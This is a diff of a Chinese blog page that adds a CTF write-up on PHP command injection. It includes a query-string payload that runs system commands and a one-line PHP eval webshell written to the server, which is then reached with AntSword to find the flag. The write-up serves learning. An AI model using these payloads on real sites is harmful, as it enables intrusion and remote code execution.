@@ -153,6 +153,110 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ctf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/06/09/ctf/">命令注入</a>
+    </h1>
+  
+
+        
+        <a href="/2021/06/09/ctf/" class="archive-article-date">
+  	<time datetime="2021-06-08T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="先看代码"><a href="#先看代码" class="headerlink" title="先看代码"></a>先看代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(!sizeof(<span class="variable">$_GET</span>))highlight_file(<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>(ob_end_flush()?<span class="string">&quot;&quot;</span>:<span class="string">&quot;&quot;</span>),(ob_start()?<span class="string">&quot;&quot;</span>:<span class="string">&quot;&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>array_pop(<span class="variable">$_GET</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>(ob_start(ob_get_clean())?array_pop(<span class="variable">$_GET</span>):<span class="string">&quot;&quot;</span>),<span class="string">&quot;&quot;</span>,(ob_end_flush()?<span class="string">&quot;&quot;</span>:<span class="string">&quot;&quot;</span>)<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="一些函数"><a href="#一些函数" class="headerlink" title="一些函数"></a>一些函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ob_end_flush ( ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>这个函数将送出最顶层缓冲区的内容（如果里边有内容的话），并关闭缓冲区。如果想进一步处理缓冲区中的内容，必须在ob_end_flush()之前调用 ob_get_contents()，因为在调用ob_end_flush()后缓冲区内容被丢弃。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ob_start ( <span class="keyword">callable</span> <span class="variable">$output_callback</span> = <span class="literal">null</span> , <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span> , <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
+<p>此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（除http标头外），相反需要输出的内容被存储在内部缓冲区中。<br>内部缓冲区的内容可以用 ob_get_contents() 函数复制到一个字符串变量中。 想要输出存储在内部缓冲区中的内容，可以使用 ob_end_flush() 函数。另外， 使用 ob_end_clean() 函数会静默丢弃掉缓冲区的内容。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_pop ( <span class="keyword">array</span> &amp;<span class="variable">$array</span> ) : mixed</span><br></pre></td></tr></table></figure>
+<p>array_pop() 弹出并返回 array 数组的最后一个单元，并将数组 array 的长度减一。</p>
+<p>参考链接 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/34947785">https://zhuanlan.zhihu.com/p/34947785</a></p>
+<p>paload ?1=dir&amp;?2=system</p>
+<p>回显</p>
+<p>得到列表 index.php，说明执行命令行命令了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210611000349932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhb2dlMTIyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>里面还有一些东西是我后面写的</p>
+<p>基本思路，命令注入——&gt;往里面写入木马——&gt;蚁剑连上去</p>
+<p>然后查lunix命令行命令 如何在命令行里创造文件写入文件</p>
+<p>本次用到命令 echo cat</p>
+<p>覆盖型写法 (文件里原来的内容被覆盖)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa&quot;</span> &gt; a.txt</span><br><span class="line"><span class="keyword">echo</span> aaa &gt; a.txt</span><br></pre></td></tr></table></figure>
+<p>添加型写法 (新内容添加在原来内容的后面）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;aaa&quot;</span> &gt;&gt; a.txt</span><br><span class="line"><span class="keyword">echo</span> aaa &gt;&gt; a.txt</span><br></pre></td></tr></table></figure>
+<p>往网站目录里写入木马 payload ?1=echo “<?php @eval($_POST["123456"]); ?>“ &gt; webshell.php&amp;?2=system</p>
+<p>检测木马是否写入payload ?1= cat webshell.php&amp;2=system<br>查看源码 可以看见写入的木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;123456&quot;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后打开蚁剑<br>输入url，密码123456连接</p>
+<p>入侵成功 翻目录找到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/2021061100044596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhb2dlMTIyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>所犯错误<br>1 cat网页回显不会把php代码回显，通过源代码查询        &lt;这个东西有问题   认为一直以为木马没写进去 php代码会被网页解析 &lt;</p>
+<p>2 蚁剑无法访问网站，检查代理，全局等</p>
+<p>试过bp的端口，后面看网站没有respons所以察觉蚁剑没能连上，</p>
+<p>总结，密码错误或者路径错误返回值为空，timeout 表示蚁剑没能访问到网站</p>
+<p>被虐的一天，我太菜了qaq</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/06/09/ctf/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-越学越不会" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -470,6 +574,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">first step</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
             
             <div class="clearfix"></div>
